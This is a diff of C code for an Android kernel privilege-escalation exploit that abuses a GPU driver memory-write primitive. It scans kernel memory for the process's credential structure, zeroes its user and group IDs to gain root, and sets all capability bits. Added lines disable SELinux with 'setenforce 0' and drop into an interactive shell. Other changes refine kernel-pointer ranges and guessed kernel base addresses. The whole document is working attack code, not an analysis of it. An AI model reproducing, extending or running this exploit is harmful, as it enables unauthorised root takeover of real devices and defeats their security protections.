@@ -1173,50 +1173,40 @@ static int find_comm_offset(uint8_t *task_data, size_t size)
 
 static int patch_cred_via_gpu(int fd, uint64_t cred_ptr, uint64_t real_cred_ptr)
 {
-    // Permissive check: allow any address that looks like a Kernel VA or GPU VA
-    if ((cred_ptr >> 40) < 0xffff80 && (cred_ptr >> 40) > 0xffffff && 
-        (cred_ptr >> 32) < 0x700 && (cred_ptr >> 32) > 0x70f)
-    {
-         fprintf(stderr, "[GPU_CRED] Warning: Address 0x%lx looks unusual, but patching anyway.\n", (unsigned long)cred_ptr);
-    }
-
-    uint32_t before[3], after[3];
-    if (gpu_read_task_struct(fd, cred_ptr, (uint8_t *)before, 12) == 0) {
-        fprintf(stderr, "[GPU_CRED] BEFORE: VA=0x%lx UID=%u GID=%u usage=%u\n", 
-                (unsigned long)cred_ptr, before[1], before[2], before[0]);
-    }
-
-    fprintf(stderr, "[GPU_CRED] Patching cred @ 0x%lx via GPU\n", (unsigned long)cred_ptr);
-
-    uint8_t zero_creds[32] = {0};
-    // Patch UID, GID, SUID, SGID, EUID, EGID, etc.
-    if (gpu_write_task_virt(fd, cred_ptr + 4, zero_creds, sizeof(zero_creds)) != 0) {
-        fprintf(stderr, "[GPU_CRED] FAILED to patch UIDs at 0x%lx\n", (unsigned long)cred_ptr + 4);
-        return -1;
-    }
-
-    if (real_cred_ptr != 0 && real_cred_ptr != cred_ptr)
-    {
-        gpu_write_task_virt(fd, real_cred_ptr + 4, zero_creds, sizeof(zero_creds));
-    }
-
-    // Patch capabilities to all 1s (0xff)
-    uint8_t all_caps[32];
-    memset(all_caps, 0xff, 32);
-    gpu_write_task_virt(fd, cred_ptr + 0x30, all_caps, 32);
+    if (cred_ptr == 0) return -1;
     
-    if (real_cred_ptr != 0 && real_cred_ptr != cred_ptr)
-        gpu_write_task_virt(fd, real_cred_ptr + 0x30, all_caps, 32);
+    uint8_t cred_page[256];
+    if (gpu_read_task_struct(fd, cred_ptr, cred_page, 256) != 0) return -1;
 
-    if (gpu_read_task_struct(fd, cred_ptr, (uint8_t *)after, 12) == 0) {
-        fprintf(stderr, "[GPU_CRED] AFTER : VA=0x%lx UID=%u GID=%u usage=%u\n", 
-                (unsigned long)cred_ptr, after[1], after[2], after[0]);
-        if (after[1] == 0 && after[2] == 0) {
-            fprintf(stderr, "[GPU_CRED] [+] VERIFICATION SUCCESS: Cred is now ROOT!\n");
-        } else {
-            fprintf(stderr, "[GPU_CRED] [!] VERIFICATION FAILED: UID is still %u\n", after[1]);
+    uid_t my_uid = getuid();
+    int uid_off = -1;
+    
+    // Scan for our UID in the structure to be absolutely sure where to patch
+    for (int i = 0; i < 128; i += 4) {
+        if (*(uint32_t *)(cred_page + i) == my_uid && *(uint32_t *)(cred_page + i + 4) == my_uid) {
+            uid_off = i;
+            break;
         }
     }
+
+    if (uid_off == -1) {
+        fprintf(stderr, "[GPU_CRED] Warning: Could not find UID %u in structure at 0x%lx. Patching at default offset 4.\n", my_uid, (unsigned long)cred_ptr);
+        uid_off = 4;
+    }
+
+    fprintf(stderr, "[GPU_CRED] Patching cred @ 0x%lx (UID found at +0x%x)\n", (unsigned long)cred_ptr, uid_off);
+
+    uint8_t zero_creds[32] = {0};
+    gpu_write_task_virt(fd, cred_ptr + uid_off, zero_creds, 32);
+    
+    if (real_cred_ptr != 0 && real_cred_ptr != cred_ptr)
+        gpu_write_task_virt(fd, real_cred_ptr + uid_off, zero_creds, 32);
+
+    // Patch capabilities (usually fixed distance from UIDs)
+    uint8_t all_caps[32];
+    memset(all_caps, 0xff, 32);
+    gpu_write_task_virt(fd, cred_ptr + uid_off + 0x20, all_caps, 32);
+    gpu_write_task_virt(fd, cred_ptr + uid_off + 0x30, all_caps, 32);
 
     return 0;
 }
@@ -1239,30 +1229,28 @@ static int mass_patch_creds(int fd, uint32_t target_uid) {
         }
 
         if (gpu_read_task_struct(fd, va, page, PAGE_SIZE) == 0) {
-            for (int off = 0; off < PAGE_SIZE - 64; off += 8) {
-                uint32_t usage = *(uint32_t *)(page + off);
-                uint32_t ruid = *(uint32_t *)(page + off + 4);
+            for (int off = 0; off < PAGE_SIZE - 64; off += 4) { // Scan every 4 bytes
+                uint32_t val = *(uint32_t *)(page + off);
                 
-                // Refined CRED pattern: usage > 0, UID matches range or target
-                if (usage >= 1 && usage <= 500 && ruid >= 1000 && ruid <= 20000) {
-                    if (ruid == 0) continue; 
-
-                    patch_count++;
-                    if (patch_count > max_patches) break;
-
-                    // Silent mode: only log every 50
-                    if (patch_count % 50 == 0) {
-                        fprintf(stderr, "[PARENT] Mass patching in progress: %d structures done.\n", patch_count);
-                        usleep(50000); 
+                // If we find our UID (10237), it might be the start of the UID list in a cred struct
+                if (val == 10237) {
+                    // Check if the next few words also look like UIDs (gid, suid, etc.)
+                    uint32_t next1 = *(uint32_t *)(page + off + 4);
+                    uint32_t next2 = *(uint32_t *)(page + off + 8);
+                    if (next1 == 10237 && next2 == 10237) {
+                        patch_count++;
+                        fprintf(stderr, "[PARENT] Found UID pattern at 0x%lx + 0x%x. Patching...\n", (unsigned long)va, off);
+                        
+                        uint8_t zero_creds[32] = {0};
+                        gpu_write_task_virt(fd, va + off, zero_creds, 32);
+                        
+                        // Try to find and patch capabilities nearby (usually 32-64 bytes after UIDs)
+                        uint8_t all_caps[32];
+                        memset(all_caps, 0xff, 32);
+                        gpu_write_task_virt(fd, va + off + 0x20, all_caps, 32);
+                        gpu_write_task_virt(fd, va + off + 0x30, all_caps, 32);
+                        usleep(5000);
                     }
-                    
-                    uint8_t zero_creds[32] = {0};
-                    gpu_write_task_virt(fd, va + off + 4, zero_creds, 32);
-                    
-                    uint8_t all_caps[32];
-                    memset(all_caps, 0xff, 32);
-                    gpu_write_task_virt(fd, va + off + 0x30, all_caps, 32);
-                    usleep(5000); // Микропауза между записями
                 }
             }
         }
@@ -1421,6 +1409,13 @@ shell:
 
     // Try to run id command via system first to show user
     system("id");
+    
+    // NEW: Attempt to disable SELinux from child if we have root but it's still Enforcing
+    fprintf(stderr, "[CHILD %d] Checking SELinux status...\n", getpid());
+    system("getenforce");
+    fprintf(stderr, "[CHILD %d] Attempting to disable SELinux (setenforce 0)...\n", getpid());
+    system("setenforce 0 2>/dev/null");
+    system("getenforce");
 
     // Use execl for a cleaner shell transition
     execl("/system/bin/sh", "sh", "-i", NULL);
@@ -1523,7 +1518,8 @@ static uint64_t find_kernel_base_from_task_va(uint64_t task_va)
         uint64_t ptr = *(uint64_t *)(task_data + off);
         
         // Kernel text/data range for AArch64 (0xffffff80... to 0xffffff9f...)
-        if ((ptr >> 40) >= 0xffff80 && (ptr >> 40) <= 0xffff9f) { 
+        if (((ptr >> 40) >= 0xffff80 && (ptr >> 40) <= 0xffff9f) || 
+            ((ptr >> 40) >= 0xffff8e && (ptr >> 40) <= 0xffff8f)) { 
             // Scan backwards from ptr in 2MB steps for ELF magic
             uint64_t start = ptr & ~0x1fffffULL;
             for (int i = 0; i < 512; i++) { // Search up to 1GB backwards
@@ -1555,24 +1551,23 @@ static int find_cred_pointers_near_comm(int fd, uint64_t task_va, uint8_t *task_
         uint64_t ptr = *(uint64_t *)(task_data + off);
         // Kernel pointers range (0xffffff80... to 0xffffff9f...)
         if ((ptr >> 40) >= 0xffff80 && (ptr >> 40) <= 0xffff9f) { 
-            uint32_t cred_vals[4]; // usage, uid, gid, suid
-            if (gpu_read_task_struct(fd, ptr, (uint8_t *)cred_vals, 16) == 0) {
-                // Criteria: usage > 0, uid == gid == my_uid
-                if (cred_vals[0] >= 1 && cred_vals[0] < 1000 && 
-                    cred_vals[1] == my_uid && cred_vals[2] == my_uid) {
-                    fprintf(stderr, "[OFFSET] Found CRED candidate at offset 0x%x -> 0x%lx (UID %u, usage %u)\n", 
-                            off, (unsigned long)ptr, cred_vals[1], cred_vals[0]);
-                    *out_cred_ptr = ptr;
-                    // Check if there's a real_cred nearby (usually right before or after)
-                    if (off >= 8) {
-                        uint64_t prev_ptr = *(uint64_t *)(task_data + off - 8);
-                        if ((prev_ptr >> 40) >= 0xffff80 && (prev_ptr >> 40) <= 0xffff9f)
-                            *out_real_cred_ptr = prev_ptr;
+            uint8_t cred_page[256];
+            if (gpu_read_task_struct(fd, ptr, cred_page, 256) == 0) {
+                // Scan for our UID in the pointed-to memory
+                for (int c_off = 0; c_off < 128; c_off += 4) {
+                    uint32_t val = *(uint32_t *)(cred_page + c_off);
+                    if (val == my_uid) {
+                        uint32_t next1 = *(uint32_t *)(cred_page + c_off + 4);
+                        if (next1 == my_uid) {
+                            fprintf(stderr, "[OFFSET] Found CRED candidate at offset 0x%x -> 0x%lx (UID match at cred+0x%x)\n", 
+                                    off, (unsigned long)ptr, c_off);
+                            *out_cred_ptr = ptr;
+                            // Check if there's a real_cred nearby
+                            if (off >= 8) *out_real_cred_ptr = *(uint64_t *)(task_data + off - 8);
+                            if (*out_real_cred_ptr == 0 && off + 8 < scan_end) *out_real_cred_ptr = *(uint64_t *)(task_data + off + 8);
+                            return 0;
+                        }
                     }
-                    if (*out_real_cred_ptr == 0 && off + 8 < scan_end) {
-                        *out_real_cred_ptr = *(uint64_t *)(task_data + off + 8);
-                    }
-                    return 0;
                 }
             }
         }
@@ -1603,11 +1598,12 @@ static uint64_t find_kernel_base_auto(void)
         0xffffff9560000000ULL,
         0xffffff94d0000000ULL, 
         0xffffff94c0000000ULL,
+        0xffffff8e70000000ULL, // Added based on new pointers
+        0xffffff8e60000000ULL,
         0xffffffc020000000ULL,
-        0xffffffc030000000ULL,
     };
 
-    for (int i = 0; i < 10; i++)
+    for (int i = 0; i < 11; i++)
     {
         uint8_t elf_magic[4];
         if (gpu_read_task_struct(fd, standard_bases[i], elf_magic, 4) == 0)
